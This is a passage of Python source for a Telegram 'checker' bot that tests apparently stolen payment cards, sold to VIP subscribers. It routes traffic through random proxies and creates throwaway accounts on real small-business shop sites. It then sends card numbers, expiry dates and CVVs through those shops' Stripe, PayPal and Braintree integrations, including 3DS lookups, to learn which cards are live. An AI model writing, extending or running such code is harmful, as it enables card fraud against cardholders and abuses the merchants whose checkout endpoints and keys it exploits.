                return "𝗥𝗘𝗔𝗧𝗧𝗘𝗠𝗣𝗧 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗 ❌"
            elif 'ACCOUNT BLOCKED BY ISSUER' in text:
                return "𝗔𝗖𝗖𝗢𝗨𝗡𝗧 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 𝗕𝗬 𝗜𝗦𝗦𝗨𝗘𝗥 ❌"
            elif 'ORDER_NOT_APPROVED' in text:
                return '𝗢𝗥𝗗𝗘𝗥 𝗡𝗢𝗧 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ❌'
            elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
                return '𝗣𝗜𝗖𝗞𝗨𝗣 𝗖𝗔𝗥𝗗 𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗡𝗗𝗜𝗧𝗜𝗢𝗡𝗦 ❌'
            elif 'PAYER_CANNOT_PAY' in text:
                return "𝗣𝗔𝗬𝗘𝗥 𝗖𝗔𝗡𝗡𝗢𝗧 𝗣𝗔𝗬 ❌"
            elif 'INSUFFICIENT_FUNDS' in text:
                return '𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀 💰'
            elif 'GENERIC_DECLINE' in text:
                return '𝗚𝗘𝗡𝗘𝗥𝗜𝗖 𝗗𝗘𝗖𝗟𝗜𝗡𝗘 ❌'
            elif 'COMPLIANCE_VIOLATION' in text:
                return "𝗖𝗢𝗠𝗣𝗟𝗜𝗔𝗡𝗖𝗘 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡 ❌"
            elif 'TRANSACTION NOT PERMITTED' in text:
                return "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗡𝗢𝗧 𝗣𝗘𝗥𝗠𝗜𝗧𝗧𝗘𝗗 ❌"
            elif 'PAYMENT_DENIED' in text:
                return '𝗣𝗔𝗬𝗠𝗘𝗡𝗧 𝗗𝗘𝗡𝗜𝗘𝗗 ❌'
            elif 'INVALID_TRANSACTION' in text:
                return "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 ❌"
            elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
                return "𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗 𝗢𝗥 𝗜𝗡𝗔𝗖𝗧𝗜𝗩𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ❌"
            elif 'SECURITY_VIOLATION' in text:
                return '𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗩𝗜𝗢𝗟𝗔𝗧𝗜𝗢𝗡 ❌'
            elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
                return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗗𝗨𝗘 𝗧𝗢 𝗨𝗣𝗗𝗔𝗧𝗘𝗗 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ❌"
            elif 'INVALID_OR_RESTRICTED_CARD' in text:
                return "𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗖𝗔𝗥𝗗 ❌"
            elif 'EXPIRED_CARD' in text:
                return "𝗘𝗫𝗣𝗜𝗥𝗘𝗗 𝗖𝗔𝗥𝗗 ❌"
            elif 'CRYPTOGRAPHIC_FAILURE' in text:
                return "𝗖𝗥𝗬𝗣𝗧𝗢𝗚𝗥𝗔𝗣𝗛𝗜𝗖 𝗙𝗔𝗜𝗟𝗨𝗥𝗘 ❌"
            elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
                return "𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗔𝗡𝗡𝗢𝗧 𝗕𝗘 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗 ❌"
            elif 'DECLINED_PLEASE_RETRY' in text:
                return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 𝗣𝗟𝗘𝗔𝗦𝗘 𝗥𝗘𝗧𝗥𝗬 𝗟𝗔𝗧𝗘𝗥 ❌"
            elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
                return "𝗘𝗫𝗖𝗘𝗘𝗗 𝗟𝗜𝗠𝗜𝗧 ❌"
            elif 'NOT FOUND' in text or 'not found' in text.lower():
                return "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀 💰"
            else:
                try:
                    result = response_approve.json()['data']['error']
                    return f"𝗘𝗿𝗿𝗼𝗿: {result}"
                except:
                    return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗘𝗥𝗥𝗢𝗥 ❌"
                    
        except requests.exceptions.Timeout:
            if attempt < max_attempts - 1:
                print(f"⚠️ PayPal Drgam timeout with proxy, retrying...")
                continue
            return "𝗘𝗿𝗿𝗼𝗿: Timeout"
        except requests.exceptions.ConnectionError:
            if attempt < max_attempts - 1:
                print(f"⚠️ PayPal Drgam connection error with proxy, retrying...")
                continue
            return "𝗘𝗿𝗿𝗼𝗿: Connection Error"
        except Exception as e:
            if attempt < max_attempts - 1:
                print(f"⚠️ PayPal Drgam error with proxy: {str(e)[:30]}, retrying...")
                continue
            return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:30]}"
    
    return "𝗘𝗿𝗿𝗼𝗿: All attempts failed"

# ================== Stripe TOME Auth Gateway with Proxy ==================
class PaymentGatewayProcessorTOME:
    """
    بوابة Stripe Auth TOME
    """
    def __init__(self, card_information, use_proxy=True):
        self.card_data = self._parse_card_information(card_information)
        self.session_manager = requests.Session()
        self.use_proxy = use_proxy
        self.processing_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # إضافة بروكسي إذا طلب
        if use_proxy:
            proxy_str = get_random_proxy()
            proxy_dict = format_proxy(proxy_str) if proxy_str else None
            if proxy_dict:
                self.session_manager.proxies.update(proxy_dict)
                print(f"✅ Stripe TOME using proxy: {proxy_str.split(':')[0] if proxy_str else 'None'}")

    def _parse_card_information(self, data_string):
        components = data_string.strip().split("|")
        if len(components) < 4:
            return None
        year_component = components[2].split("20")[1] if "20" in components[2] else components[2]
        return {
            'card_number': components[0],
            'expiration_month': components[1],
            'expiration_year': year_component,
            'security_code': components[3]
        }

    def _generate_secure_identifier(self):
        random_chars = ''.join(random.choices(string.ascii_lowercase, k=20))
        return f"{random_chars}tome@gmail.com"

    def _create_request_headers(self):
        return {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en,ar;q=0.9,en-US;q=0.8'
        }

    def _extract_nonce_value(self, html_content, pattern):
        match_result = re.search(pattern, html_content)
        return match_result.group(1) if match_result else None

    def _execute_user_registration(self):
        try:
            initial_response = self.session_manager.get(
                'https://roskin.co.uk/my-account/add-payment-method/',
                headers=self._create_request_headers()
            )
            registration_nonce = self._extract_nonce_value(
                initial_response.text,
                r'name="woocommerce-register-nonce" value="(.*?)"'
            )
            if not registration_nonce:
                return False
            user_email = self._generate_secure_identifier()
            registration_data = {
                'email': user_email,
                'password': 'Tome'+user_email,
                'wc_order_attribution_session_entry': 'https://roskin.co.uk/my-account/add-payment-method/',
                'wc_order_attribution_session_start_time': self.processing_timestamp,
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
                'woocommerce-register-nonce': registration_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register',
            }
            registration_response = self.session_manager.post(
                'https://roskin.co.uk/my-account/',
                params={'action': 'register'},
                data=registration_data,
                headers=self._create_request_headers()
            )
            return registration_response.status_code == 200
        except Exception:
            return False

    def _retrieve_payment_nonce(self):
        try:
            payment_page_response = self.session_manager.get(
                'https://roskin.co.uk/my-account/add-payment-method/',
                headers=self._create_request_headers()
            )
            payment_nonce = self._extract_nonce_value(
                payment_page_response.text,
                r'"createAndConfirmSetupIntentNonce":"(.*?)"'
            )
            return payment_nonce
        except Exception:
            return None

    def _create_payment_method(self):
        try:
            payment_endpoint = "https://api.stripe.com/v1/payment_methods"
            payment_payload = {
                'type': "card",
                'card[number]': self.card_data['card_number'],
                'card[cvc]': self.card_data['security_code'],
                'card[exp_year]': self.card_data['expiration_year'],
                'card[exp_month]': self.card_data['expiration_month'],
                'allow_redisplay': "unspecified",
                'billing_details[address][country]': "IQ",
                'payment_user_agent': "stripe.js/5127fc55bb; stripe-js-v3/5127fc55bb; payment-element; deferred-intent",
                'referrer': "https://roskin.co.uk",
                'time_on_page': str(random.randint(40000, 50000)), 
                'client_attribution_metadata[client_session_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}",
                'client_attribution_metadata[merchant_integration_source]': "elements",
                'client_attribution_metadata[merchant_integration_subtype]': "payment-element",
                'client_attribution_metadata[merchant_integration_version]': "2021",
                'client_attribution_metadata[payment_intent_creation_flow]': "deferred",
                'client_attribution_metadata[payment_method_selection_flow]': "merchant_specified",
                'client_attribution_metadata[elements_session_config_id]': f"{random.randint(10000000, 99999999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(1000,9999)}-{random.randint(100000000000,999999999999)}",
                'key': "pk_live_51Jx9JdFgVpnto4wT08kPUACRjupgUkOYouc3dE2P4a92fViZbOW1VLBWuKc5xzrWXujJGIT91FdHvvl7R6TW3kJ400hkkbpg0j"
            }
            payment_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
                'Accept': "application/json",
                'origin': "https://js.stripe.com",
                'referer': "https://js.stripe.com/",
            }
            payment_response = self.session_manager.post(
                payment_endpoint, 
                data=payment_payload, 
                headers=payment_headers
            )
            return payment_response.json().get('id')
        except Exception:
            return None

    def _create_setup_intent(self, payment_method_id, setup_nonce):
        try:
            setup_endpoint = "https://roskin.co.uk/wp-admin/admin-ajax.php"
            setup_payload = {
                'action': "wc_stripe_create_and_confirm_setup_intent",
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': "card",
                '_ajax_nonce': setup_nonce
            }
            setup_headers = {
                'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
                'x-requested-with': "XMLHttpRequest",
                'origin': "https://roskin.co.uk",
                'referer': "https://roskin.co.uk/my-account/add-payment-method/",
            }
            setup_response = self.session_manager.post(
                setup_endpoint, 
                data=setup_payload, 
                headers=setup_headers
            )
            return setup_response.json()
        except Exception:
            return None

    def process_payment_authorization(self):
        if not self.card_data:
            return "Invalid Card Information"
        if not self._execute_user_registration():
            return "User Registration Failed"
        payment_nonce = self._retrieve_payment_nonce()
        if not payment_nonce:
            return "Payment Nonce Retrieval Failed"
        payment_method_id = self._create_payment_method()
        if not payment_method_id:
            return "Payment Method Creation Failed"
        setup_result = self._create_setup_intent(payment_method_id, payment_nonce)
        if not setup_result:
            return "Setup Intent Creation Failed"
        if setup_result.get('success') == True:
            return "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
        else:
            error_data = setup_result.get('data', {}).get('error', {})
            return error_data.get('message', 'Processing Error')

def stripe_auth_gate_tome(ccx, use_proxy=True):
    """
    دالة غلاف لبوابة Stripe Auth TOME
    """
    # محاولتين كحد أقصى
    max_attempts = 2
    for attempt in range(max_attempts):
        processor = PaymentGatewayProcessorTOME(ccx, use_proxy=(attempt == 0))
        result = processor.process_payment_authorization()
        
        # إذا نجح أو كان خطأ غير متعلق بالاتصال، نرجع النتيجة
        if "✅" in result or "Invalid" not in result:
            return result
        
        # إذا فشل بسبب الاتصال وجربنا بروكسي، نجرب بدون بروكسي
        if attempt < max_attempts - 1:
            print(f"⚠️ Stripe TOME failed with proxy, retrying without proxy...")
            continue
    
    return result

# ================== Passed Gateway Function (Braintree 3DS) with Proxy ==================
def passed_gate(ccx):
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid card format"
    
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3].strip()
    if "20" in yy:
        yy = yy.split("20")[1]
    
    # محاولتين كحد أقصى
    max_attempts = 2
    for attempt in range(max_attempts):
        r = requests.Session()
        
        # إضافة بروكسي عشوائي في المحاولة الأولى فقط
        if attempt == 0:
            proxy_str = get_random_proxy()
            proxy_dict = format_proxy(proxy_str) if proxy_str else None
            if proxy_dict:
                r.proxies.update(proxy_dict)
                print(f"✅ Passed using proxy: {proxy_str.split(':')[0] if proxy_str else 'None'}")
        
        try:
            # مسح السلة
            clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
            r.post(clear_url, timeout=10)
            
            # إضافة منتج إلى السلة
            headers = {
                'authority': 'southenddogtraining.co.uk',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://southenddogtraining.co.uk',
                'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            json_data = {
                'id': '123368',
                'quantity': '1',
            }
            
            response = r.post(
                'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
                headers=headers,
                json=json_data,
                timeout=10
            )
            cart_hash = response.json()['cart_hash']
            
            # زيارة صفحة الدفع
            cookies = {
                'clear_user_data': 'true',
                'woocommerce_items_in_cart': '1',
                'woocommerce_cart_hash': cart_hash,
                'pmpro_visit': '1',
            }
            
            headers = {
                'authority': 'southenddogtraining.co.uk',
                'accept': 'text/html',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers, timeout=10)
            
            # استخراج البيانات المطلوبة
            client_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
            if not client_match:
                if attempt < max_attempts - 1:
                    continue
                return "Failed to extract client token"
            client = client_match.group(1)
            
            # الحصول على client token
            headers = {
                'authority': 'southenddogtraining.co.uk',
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://southenddogtraining.co.uk',
                'referer': 'https://southenddogtraining.co.uk/checkout/',
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            data = {
                'action': 'wc_braintree_credit_card_get_client_token',
                'nonce': client,
            }
            
            response = r.post(
                'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=10
            )
            
            enc = response.json()['data']
            dec = base64.b64decode(enc).decode('utf-8')
            au_match = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
            if not au_match:
                if attempt < max_attempts - 1:
                    continue
                return "Failed to extract auth fingerprint"
            au = au_match[0]
            
            # Tokenize credit card
            headers = {
                'authority': 'payments.braintree-api.com',
                'accept': '*/*',
                'authorization': f'Bearer {au}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': 'd118f7da-b7b0-4b4e-847a-c81bc63dad77',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': n,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvc,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }
            
            response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data, timeout=10)
            tok = response.json()['data']['tokenizeCreditCard']['token']
            
            # 3DS lookup
            headers = {
                'authority': 'api.braintreegateway.com',
                'accept': '*/*',
                'content-type': 'application/json',
                'origin': 'https://southenddogtraining.co.uk',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            }
            
            json_data = {
                'amount': '2.99',
                'additionalInfo': {},
                'bin': n[:6],
                'dfReferenceId': 'ref_123',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.94.0',
                },
                'authorizationFingerprint': au,
            }
            
            response = r.post(
                f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
                headers=headers,
                json=json_data,
                timeout=10
            )
            
            vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
            
            if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
                return '3DS Authenticate Attempt Successful ✅'
            elif 'challenge_required' in vbv:
                return '3DS Challenge Required ⚠️'
            else:
                return vbv
                
        except Exception as e:
            if attempt < max_attempts - 1:
                print(f"⚠️ Passed error with proxy: {str(e)[:30]}, retrying...")
                continue
            return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}"
    
    return "𝗘𝗿𝗿𝗼𝗿: All attempts failed"

# ================== Set Amount Command ==================
@bot.message_handler(commands=["setamount"])
def set_amount_command(message):
    def my_function():
        id = message.from_user.id
        
        try:
            amount = message.text.split(' ', 1)[1].strip()
            amount_float = float(amount)
            
            if amount_float < 0.01 or amount_float > 5.00:
                bot.reply_to(message, "<b>❌ 𝗔𝗺𝗼𝘂𝗻𝘁 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 $0.01 𝗮𝗻𝗱 $5.00</b>")
                return
            
            set_user_amount(id, f"{amount_float:.2f}")
            bot.reply_to(message, f"<b>✅ 𝗔𝗺𝗼𝘂𝗻𝘁 𝘀𝗲𝘁 𝘁𝗼: ${amount_float:.2f}</b>")
            
        except (IndexError, ValueError):
            current = get_user_amount(id)
            bot.reply_to(message, f"<b>📊 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current}\n\n𝗧𝗼 𝗰𝗵𝗮𝗻𝗴𝗲 𝘂𝘀𝗲:\n/setamount 0.50\n(𝗳𝗿𝗼𝗺 $0.01 𝘁𝗼 $5.00)</b>")
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["start"])
def start(message):
    def my_function():
        name = message.from_user.first_name
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        id = message.from_user.id
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
            with open('data.json', 'r') as json_file:
                existing_data = json.load(json_file)
            new_data = {
                id: {
                    "plan": "𝗙𝗥𝗘𝗘",
                    "timer": "none",
                }
            }
            existing_data.update(new_data)
            with open('data.json', 'w') as json_file:
                json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
        
        keyboard = types.InlineKeyboardMarkup()
        contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
        keyboard.add(contact_button)
        
        random_number = random.randint(33, 82)
        photo_url = f'https://t.me/bkddgfsa/{random_number}'
        
        bot.send_photo(
            chat_id=message.chat.id,
            photo=photo_url,
            caption=f'''<b>🌸 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 {name}! 🌸

𝗙𝗿𝗲𝗲 𝗯𝗼𝘁 𝗳𝗼𝗿 𝗮𝗹𝗹 𝗺𝘆 𝗳𝗿𝗶𝗲𝗻𝗱𝘀 𝗔𝗻𝗱 𝗮𝗻𝘆𝗼𝗻𝗲 𝗲𝗹𝘀𝗲 
━━━━━━━━━━━━━━━━━
🌟 𝗚𝗼𝗼𝗱 𝗹𝘂𝗰𝗸!  
『@minux_rida』</b>
''',
            reply_markup=keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

@bot.message_handler(commands=["cmds"])
def cmds_command(message):
    with open('data.json', 'r') as file:
        json_data = json.load(file)
    id = message.from_user.id
    try:
        BL = json_data[str(id)]['plan']
    except:
        BL = '𝗙𝗥𝗘𝗘'
    
    current_amount = get_user_amount(id)
    
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text=f"✨ {BL} ✨", callback_data='plan')
    keyboard.add(contact_button)
    
    bot.send_message(
        chat_id=message.chat.id,
        text=f'''<b> 
𝗧𝗵𝗲𝘀𝗲 𝗔𝗿𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁'𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀

𝗣𝗮𝘆𝗣𝗮𝗹  𝗚𝗮𝘁𝗲𝘄𝗮𝘆 <code>/pp</code>
𝗦𝘁𝗿𝗶𝗽𝗲  𝗔𝘂𝘁𝗵 <code>/chk</code>
𝗦𝗵𝗼𝗽𝗶𝗳𝘆 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 <code>/sf</code>
𝗣𝗮𝘀𝘀𝗲𝗱 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 (𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝟯𝗗𝗦) <code>/vbv</code>

𝗣𝗮𝘆𝗣𝗮𝗹 𝗰𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current_amount}

𝗧𝗼 𝗰𝗵𝗮𝗻𝗴𝗲 𝗣𝗮𝘆𝗣𝗮𝗹 𝗮𝗺𝗼𝘂𝗻𝘁: <code>/setamount</code>

𝗪𝗲 𝗪𝗶𝗹𝗹 𝗕𝗲 𝗔𝗱𝗱𝗶𝗻𝗴 𝗦𝗼𝗺𝗲 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 𝗔𝗻𝗱 𝗧𝗼𝗼𝗹𝘀 𝗦𝗼𝗼𝗻</b>
''',
        reply_markup=keyboard
    )

# ================== PayPal Drgam Command (/pp) ==================
@bot.message_handler(commands=["pp"])
def paypal_command(message):
    def my_function():
        id = message.from_user.id
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open('data.json', 'w') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        try:
            card = message.text.split(' ', 1)[1]
        except IndexError:
            current_amount = get_user_amount(id)
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/pp 4111111111111111|12|25|123\n\n💰 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current_amount}</b>")
            return
        
        user_amount = get_user_amount(id)
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗣𝗮𝘆𝗣𝗮𝗹 ... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}</b>")
        
        bin_num = card[:6]
        bin_info, bank, country, country_code = get_bin_info(bin_num)
        
        start_time = time.time()
        result = paypal_gate_drgam(card, user_amount)
        execution_time = time.time() - start_time
        
        if "✅" in result:
            status_emoji = "✅"
        elif "💰" in result:
            status_emoji = "💰"
        elif "⚠️" in result:
            status_emoji = "⚠️"
        else:
            status_emoji = "❌"
        
        minux_keyboard = types.InlineKeyboardMarkup()
        minux_button = types.InlineKeyboardButton(text="𝗺𝗶𝗻𝘂𝘅 - 🍀", url="https://t.me/minux_rida")
        minux_keyboard.add(minux_button)
        
        formatted_message = f"""<b>#pp_Gateway ${user_amount} 🔥
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗖𝗮𝗿𝗱: <code>{card}</code>
[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀: {result} {status_emoji}
[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result}!
[ϟ] 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}
- - - - - - - - - - - - - - - - - - - - - - -
[ϟ] 𝗕𝗶𝗻: {bin_info}
[ϟ] 𝗕𝗮𝗻𝗸: {bank}
[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {country_code}
- - - - - - - - - - - - - - - - - - - - - - -
[⌥] 𝗧𝗶𝗺𝗲: {execution_time:.2f}'s
- - - - - - - - - - - - - - - - - - - - - - -
[⌤] 𝗗𝗲𝘃 𝗯𝘆: 𝗺𝗶𝗻𝘂𝘅 - 🍀</b>"""
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=msg.message_id,
            text=formatted_message,
            reply_markup=minux_keyboard
        )
    
    my_thread = threading.Thread(target=my_function)
    my_thread.start()

# ================== Stripe TOME Auth Command (/chk) ==================
@bot.message_handler(commands=["chk"])
def stripe_auth_command(message):
    def my_function():
        id = message.from_user.id
        with open('data.json', 'r') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘':
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="𝗠𝗜𝗡𝗨𝗫", url="https://t.me/minux_rida")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with open('data.json', 'w') as file:
                    json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        try:
            card = message.text.split(' ', 1)[1]
        except IndexError:
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/chk 4111111111111111|12|25|123</b>")
            return
        
        msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱 𝘄𝗶𝘁𝗵 𝗦𝘁𝗿𝗶𝗽𝗲  𝗔𝘂𝘁𝗵... ⏳</b>")
        
        bin_num = card[:6]
